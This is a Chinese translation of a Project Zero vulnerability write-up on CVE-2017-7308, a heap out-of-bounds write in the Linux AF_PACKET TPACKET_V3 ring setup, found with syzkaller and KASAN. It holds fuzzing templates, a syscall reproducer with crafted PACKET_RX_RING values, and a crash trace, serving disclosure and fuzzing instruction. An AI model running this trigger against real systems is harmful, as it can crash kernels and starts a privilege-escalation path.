# 【技术分享】如何通过数据包套接字攻击Linux内核
|
##### 译文声明
本文是翻译文章，文章来源：googleprojectzero.blogspot.hk
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
****
翻译：[ **兴趣使然的小胃**](http://bobao.360.cn/member/contribute?uid=2819002922)
**稿费：200RMB**
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**一、前言**
最近我花了一些时间使用[
**syzkaller**](https://github.com/google/syzkaller)工具对Linux内核中与网络有关的接口进行了模糊测试（fuzz）。除了最近发现的[
**DCCP套接字漏洞**](http://seclists.org/oss-sec/2017/q1/471)之外，我还发现了另一个漏洞，该漏洞位于数据包套接字（packet
sockets）中。在这篇文章中，我会向大家介绍这个漏洞的发现过程，以及我们如何[
**利用这个漏洞**](https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-7308)来提升权限。
该漏洞本身（[ **CVE-2017-7308**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7308)）是一个符号类型漏洞，会导致堆越界（heap-out-of-bounds）写入问题。在启用TPACKET_V3版本的环形缓冲区（ring
buffer）条件下，我们可以通过为AF_PACKET套接字的PACKET_RX_RING选项提供特定的参数来触发这个漏洞。漏洞触发成功后，在“net/packet/af_packet.c”源码中，“packet_set_ring()”函数中的完整性检查过程就会被绕过，最终导致越界访问。“packet_set_ring()”函数中的完整性检查过程如下所示：
    4207                 if (po->tp_version >= TPACKET_V3 &&
    4208                     (int)(req->tp_block_size -    4209                           BLK_PLUS_PRIV(req_u->req3.tp_sizeof_priv)) <= 0)
    4210                         goto out;
2011年8月19日，这个bug与TPACKET_V3的实现一起提交到Github上编号为[
**f6fb8f10**](https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a)的commit（“af-packet：TPACKET_V3灵活缓冲区的实现”）。2014年8月15日，在编号为[
**dc808110**](https://github.com/torvalds/linux/commit/dc808110bb62b64a448696ecac3938902c92e1ab)的commit中，人们尝试通过添加额外的检查流程来修复这个bug，但根据本文的分析，我们发现这个修复过程并不完美。这个bug最终于2017年3月29日在编号为2b6867c2的[
**commit**](https://github.com/torvalds/linux/commit/2b6867c2ce76c596676bec7d2d525af525fdc6e2)中被修复。
如果Linux内核启用了AF_PACKET套接字选项（CONFIG_PACKET=y），那么它就会受到这个漏洞影响，而大多数Linux分发版内核都启用了该选项。漏洞利用需要具备CAP_NET_RAW权限，才能创建这类套接字。然而，如果启用了用户命名空间（user
namespace，通过CONFIG_USER_NS=y实现），我们就可能在用户命名空间中使用非特权用户来利用这个漏洞。
由于数据包套接字是Linux内核中广泛应用的一个功能，因此这个漏洞会影响包括Ubuntu、Android在内的许多流行的Linux发行版。需要注意的是，Android中除了某些特权组件之外，明确禁止任何未受信代码访问AF_PACKET套接字。新版的Ubuntu内核已经发布，此外Android也计划在7月份推出更新。
**二、Syzkaller简介**
我使用syzkaller以及KASAN工具发现了这个bug。Syzkaller是一款针对Linux系统调用的覆盖型模糊测试器，KASAN是一款动态内存错误检测器。我会向大家介绍syzkaller的工作原理，以及如何使用该工具对某些内核接口进行模糊测试，方便大家掌握这个工具。
让我们先来看看syzkaller模糊测试器如何工作。在为每个系统调用（syscall）手动编写描述模板的基础上，syzkaller可以（按照syscall的调用顺序）生成随机的程序。这个模糊测试器会运行这些程序，收集每个程序的代码覆盖情况。通过代码覆盖信息，syzkaller会保存一个程序语料库，触发内核中的不同代码路径。每当新的程序触发了一条新的代码路径（也就是说给出了新的覆盖信息），syzkaller就会将其添加到语料库中。除了生成全新的程序之外，syzkaller也可以更改语料库中的已有程序。
Syzkaller最好搭配动态错误检测器一起使用，如KASAN（从4.0版开始就可以检测诸如越界访问（out-of-bounds）以及释放后重用（use-after-free）之类的内存错误）、KMSAN（可以检查未初始化内存使用错误，原型版本刚刚发布）或者KTSAN（可以检测数据冲突（data
race）错误，原型版本已发布）之类的动态错误检测器都可以。Syzkaller可以对内核进行压力测试，执行各种有趣的代码路径，然后错误检测器就能检测并报告对应的错误。
使用syzkaller查找错误的通常流程如下：
1、确保已正确安装syzkaller。可以参考使用说明以及wiki中的详细安装步骤。
2、为待测试的特定内核接口编写模板描述。
3、在syzkaller选项中，指定该接口具体使用的系统调用。
4、运行syzkaller，直到它发现错误为止。通常情况下，如果该接口之前尚未使用syzkaller进行测试，那么这个过程会比较快。
Syzkaller自己有一套声明语言，用来描述系统调用模板。我们可以参考sys/sys.txt中给出的样例，也可以参考sys/README.md给出的语法信息。以下内容截取自我所使用的syzkaller描述信息，用来发现AF_PACKET套接字上的错误：
    resource sock_packet[sock]
    define ETH_P_ALL_BE htons(ETH_P_ALL)
    socket$packet(domain const[AF_PACKET], type flags[packet_socket_type], proto const[ETH_P_ALL_BE]) sock_packet
    packet_socket_type = SOCK_RAW, SOCK_DGRAM
    setsockopt$packet_rx_ring(fd sock_packet, level const[SOL_PACKET], optname const[PACKET_RX_RING], optval ptr[in, tpacket_req_u], optlen len[optval])
    setsockopt$packet_tx_ring(fd sock_packet, level const[SOL_PACKET], optname const[PACKET_TX_RING], optval ptr[in, tpacket_req_u], optlen len[optval])
    tpacket_req {
     tp_block_size  int32
     tp_block_nr  int32
     tp_frame_size  int32
     tp_frame_nr  int32
    }
    tpacket_req3 {
     tp_block_size  int32
     tp_block_nr  int32
     tp_frame_size  int32
     tp_frame_nr  int32
     tp_retire_blk_tov int32
     tp_sizeof_priv int32
     tp_feature_req_word int32
    }
    tpacket_req_u [
     req  tpacket_req
     req3  tpacket_req3
    ] [varlen]
大多数语法我们一看就能明白。首先，我们声明了一个新的sock_packet类型。这种类型继承自现有的sock类型。这样一来，对于使用sock类型作为参数的系统调用而言，syzkaller也会在sock_packet类型的套接字上使用这种系统调用。
在这之后，我们声明了一个新的系统调用：socket$packet。“$”符号之前的部分作用是告诉syzkaller应该使用哪种系统调用，而“$”符号之后的部分用来区分同一种系统调用的不同类型。这种方式在处理类似ioctl的系统调用时非常有用。“socket$packet”系统调用会返回一个sock_packet套接字。
然后我们声明了setsockopt$packet_rx_ring以及setsockopt$packet_tx_ring。这些系统调用会在sock_packet套接字上设置PACKET_RX_RING以及PACKET_TX_RING套接字选项。我会在下文讨论这两个选项的具体细节。这两者都使用了tpacket_req_u联合体（union）作为套接字选项的值。tpacket_req_u联合体包含两个结构体成员，分别为tpacket_req以及tpacket_req3。
一旦描述信息添加完毕，我们就可以使用syzkaller对与数据包相关的系统调用进行模糊测试。我在syzkaller管理配置选项中的设置信息如下所示：
    "enable_syscalls": [
      "socket$packet", "socketpair$packet", "accept$packet", "accept4$packet", "bind$packet", "connect$packet", "sendto$packet", "recvfrom$packet", "getsockname$packet", "getpeername$packet", "listen", "setsockopt", "getsockopt", "syz_emit_ethernet"
     ],
使用这些描述信息运行syzkaller一段时间之后，我开始观察到内核崩溃现象。某个syzkaller应用所触发的bug如下所示：
    mmap(&(0x7f0000000000/0xc8f000)=nil, (0xc8f000), 0x3, 0x32, 0xffffffffffffffff, 0x0)
    r0 = socket$packet(0x11, 0x3, 0x300)
    setsockopt$packet_int(r0, 0x107, 0xa, &(0x7f000061f000)=0x2, 0x4)
    setsockopt$packet_rx_ring(r0, 0x107, 0x5, &(0x7f0000c8b000)=@req3={0x10000, 0x3, 0x10000, 0x3, 0x4, 0xfffffffffffffffe, 0x5}, 0x1c)
KASAN的某个报告如下所示。需要注意的是，由于访问点距离数据块边界非常远，因此分配和释放栈没有对应溢出（overflown）对象。
    ==================================================================
    BUG: KASAN: slab-out-of-bounds in prb_close_block net/packet/af_packet.c:808
    Write of size 4 at addr ffff880054b70010 by task syz-executor0/30839
    CPU: 0 PID: 30839 Comm: syz-executor0 Not tainted 4.11.0-rc2+ #94
    Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011
    Call Trace:
     __dump_stack lib/dump_stack.c:16 [inline]
     dump_stack+0x292/0x398 lib/dump_stack.c:52
     print_address_description+0x73/0x280 mm/kasan/report.c:246
     kasan_report_error mm/kasan/report.c:345 [inline]
     kasan_report.part.3+0x21f/0x310 mm/kasan/report.c:368
     kasan_report mm/kasan/report.c:393 [inline]
     __asan_report_store4_noabort+0x2c/0x30 mm/kasan/report.c:393
     prb_close_block net/packet/af_packet.c:808 [inline]
     prb_retire_current_block+0x6ed/0x820 net/packet/af_packet.c:970
     __packet_lookup_frame_in_block net/packet/af_packet.c:1093 [inline]
     packet_current_rx_frame net/packet/af_packet.c:1122 [inline]
     tpacket_rcv+0x9c1/0x3750 net/packet/af_packet.c:2236
     packet_rcv_fanout+0x527/0x810 net/packet/af_packet.c:1493
     deliver_skb net/core/dev.c:1834 [inline]
     __netif_receive_skb_core+0x1cff/0x3400 net/core/dev.c:4117
     __netif_receive_skb+0x2a/0x170 net/core/dev.c:4244
     netif_receive_skb_internal+0x1d6/0x430 net/core/dev.c:4272
     netif_receive_skb+0xae/0x3b0 net/core/dev.c:4296
     tun_rx_batched.isra.39+0x5e5/0x8c0 drivers/net/tun.c:1155
     tun_get_user+0x100d/0x2e20 drivers/net/tun.c:1327
     tun_chr_write_iter+0xd8/0x190 drivers/net/tun.c:1353
     call_write_iter include/linux/fs.h:1733 [inline]
     new_sync_write fs/read_write.c:497 [inline]
     __vfs_write+0x483/0x760 fs/read_write.c:510